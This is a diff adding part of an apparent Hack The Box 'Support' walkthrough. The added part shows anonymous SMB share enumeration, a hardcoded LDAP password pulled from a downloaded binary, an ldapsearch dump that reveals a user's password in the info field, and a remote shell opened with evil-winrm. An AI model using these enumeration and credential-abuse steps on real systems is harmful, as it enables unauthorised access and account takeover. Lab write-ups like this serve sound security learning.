@@ -51,3 +51,111 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 401.59 seconds
 ```
+
+```console
+└──╼ [★]$ smbclient -N -L //10.129.53.172/
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	support-tools   Disk      support staff tools
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+```
+
+```console
+└──╼ [★]$ smbclient -N //10.129.53.172/support-tools
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jul 20 18:01:06 2022
+  ..                                  D        0  Sat May 28 12:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022
+
+		4026367 blocks of size 4096. 968598 blocks available
+smb: \> get UserInfo.exe.zip
+getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (7970.4 KiloBytes/sec) (average 7970.4 KiloBytes/sec)
+smb: \> 
+```
+
+At first I used Ghidra to check it out but I was only able to get a password string and what I suspected was a username. Neither worked for me. However using dnspy worked.
+
+Cyberchef password
+
+![image](https://user-images.githubusercontent.com/105310322/188973978-b4ffece0-4f72-4376-951f-b269626694c3.png)
+
+ldap gives too much information back but in this particular section we get some interesting data in the info field ```Ironside47pleasure40Watchful```
+
+```console
+└──╼ [★]$ ldapsearch -x -H ldap://10.129.53.172 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"
+# extended LDIF
+#
+# LDAPv3
+# base <CN=Users,DC=support,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: support
+c: US
+l: Chapel Hill
+st: NC
+postalCode: 27514
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20220528111201.0Z
+uSNCreated: 12617
+info: Ironside47pleasure40Watchful
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 12630
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: support
+sAMAccountType: 805306368
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
+dSCorePropagationData: 20220528111201.0Z
+dSCorePropagationData: 16010101000000.0Z
+```
+
+```└──╼ [★]$ evil-winrm -u support -p Ironside47pleasure40Watchful -i 10.129.53.172
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\support\Documents> 
+```
